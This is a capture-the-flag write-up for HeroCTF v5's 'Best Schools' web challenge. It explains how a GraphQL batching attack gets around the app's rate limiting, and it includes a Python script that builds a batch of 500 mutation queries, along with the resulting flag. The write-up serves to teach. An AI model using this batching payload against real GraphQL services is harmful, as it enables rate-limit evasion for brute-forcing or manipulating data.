# Best Schools

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

- 177 solves / 50 points
- Difficulty: Easy
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

An anonymous company has decided to publish a ranking of the best schools, and it is based on the number of clicks on a button! Make sure you get the 'Flag CyberSecurity School' in first place and you'll get your reward!  
  
> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)  
  
Format : **Hero{flag}**  
Author : **Worty**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513135752.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513123547.png)

In here, we can add 1 to the number of clicks in each school, and get the flag.

**We can try to click the "Get The Flag!" button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513123924.png)

When we clicked that, it returns "'Flag CyberSecurity School' is not the best, no flag for you".

With that said, **our goal should be getting more than 1337 number of clicks in "Flag CyberSecurity School".**

Now, if we proxy through our requests, we can see the following **GraphQL queries**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513124226.png)

**View source page:**
```html
[...]
            <div class="col text-center">
                <p class="lead">Welcome on the school ranking app !</p>
                <p class="lead">It's very simple, just click on "i'm at this school" and the ranking will be updated !</p>
                <div id="ranking"></div>
                <input type="button" class="btn btn-primary" onclick="getFlag()" value="Get The Flag !"></input>
            </div>
[...]
    <script>
    [...]
    function getFlag()
        {
            fetch("/flag", {
                method: "GET",
                headers:{
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                }
            }).then(r => r.json())
            .then(
                function(data)
                {
                    alert(data.data)
                }
            )
        }
    [...]
    </script>
```

When we click the "Get The Flag!" button, it'll send a GET request to `/flag`, and it'll response us with some data, which is the output of checking the highest number of clicks?

**Then, when the window is loaded:**
```html
    <script>
        var schoolNames = ["Cyber Super School","University Of Cybersecurity","Flag CyberSecurity School","The Best Best CyberSecurity School"]
        function updateHtml(res_graphql)
        {
            $("#ranking").empty();
            var best_school = res_graphql[0].data.getNbClickSchool.schoolName;
            var maxNbClick = res_graphql[0].data.getNbClickSchool.nbClick
            var html_append = `
                <table class="table">
                    <thead class="thead-dark">
                    <tr>
                    <th scope="col">#</th>
                    <th scope="col">School Name</th>
                    <th scope="col">Number of clicks</th>
                    <th scope="col">Action</th>
                    </tr>
                    </thead>
                    <tbody>
            `;
            for(var i=0; i<res_graphql.length; i++)
            {
                if(maxNbClick < res_graphql[i].data.getNbClickSchool.nbClick)
                {
                    best_school = res_graphql[i].data.getNbClickSchool.schoolName;
                    maxNbClick = res_graphql[i].data.getNbClickSchool.nbClick;
                }
                html_append+=`<tr><th scope="row">${res_graphql[i].data.getNbClickSchool.schoolId}</th><td>${res_graphql[i].data.getNbClickSchool.schoolName}</td><td id="click${res_graphql[i].data.getNbClickSchool.schoolId}">${res_graphql[i].data.getNbClickSchool.nbClick}</td><td><input type="button" onclick="updateNbClick('${res_graphql[i].data.getNbClickSchool.schoolName}')" class="btn btn-warning" value="I'm at this school"></input></td>`;
            }
            html_append+="</tbody></table>";
            html_append+=`<p class='lead'>The best school for cybersecurity is : ${best_school} with ${maxNbClick} clicks ! Congratulations !</p>`
            $("#ranking").append(html_append)
        }
        [...]
        $(document).ready(async function(){
            var res_graphql = [];
            for(var i=0; i<schoolNames.length; i++)
            {
                var res = await fetch("/graphql", {
                    method: "POST",
                    headers:{
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify({query: `{getNbClickSchool(schoolName: "${schoolNames[i]}" ){schoolId, schoolName, nbClick}}`})
                })
                .then(r => r.json())
                .then(
                    function(data)
                    {
                        res_graphql.push(data)
                    }
                )
            }
            updateHtml(res_graphql)
        });
    </script>
```

It'll loop through all the `schoolNames` and get the number of clicks via GraphQL `getNbClickSchool` query, then update the HTML content.

**Next, when we clicked "I'm at this school" button, it'll run the following JavaScript function:**
```js
function updateNbClick(schoolName)
{
    var updated_school = [];
    fetch("/graphql", {
        method: "POST",
        headers:{
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            body: JSON.stringify({query: `mutation { increaseClickSchool(schoolName: "${schoolName}"){schoolId, nbClick} }`})
    }).then(r => r.json())
    .then(
        function(data)
        {
            if(data.error != undefined)
            {
                alert(data.error)
            }
            document.getElementById(`click${data.data.increaseClickSchool.schoolId}`).innerHTML = data.data.increaseClickSchool.nbClick
        }
    )
}
```

This will send a POST request to `/graphql` endpoint and **using the `increaseClickSchool` mutation query to update the number of clicks.**

Now, we can we do to update the number of clicks in "Flag CyberSecurity School" more than 1337??

Since **mutation query** is used to make changes in the server-side, we could pay extra attention on the `increaseClickSchool` mutation query.

**When we send the query too fast, it'll returns the following response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513134140.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513134153.png)

## Exploitation

That being said, it has implemented rate limiting.

Hmm that's weird!!

**Can we bypass that??**

Yes we can, and it's an attack in GraphQL: ***GraphQL Batching Attack***

**In [Paulo A. Silva](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/) blog, we could send multiple queries:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513134441.png)

**Let's try that!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513134450.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513134500.png)

Oh!! it works!!

**Now, let's copy those mutation query more than 1337 times, and we should able to get the flag!**

**Generating payload Python script:**
```py
#!/usr/bin/env python3

if __name__ == '__main__':
    batchingPayload = '''{"query":"mutation { increaseClickSchool(schoolName: \\"Flag CyberSecurity School\\"){schoolId, nbClick} }"},'''
    lastBatchingPayload = '''{"query":"mutation { increaseClickSchool(schoolName: \\"Flag CyberSecurity School\\"){schoolId, nbClick} }"}'''
    print(f'[{batchingPayload * 499}{lastBatchingPayload}]')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513135037.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513135136.png)

We're very close!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513135241.png)

Nice! Let's get the flag!

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513135340.png)

- **Flag: `Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3_l1m1t_!!}`**

## Conclusion

What we've learned:

1. Exploiting GraphQL Batching Attack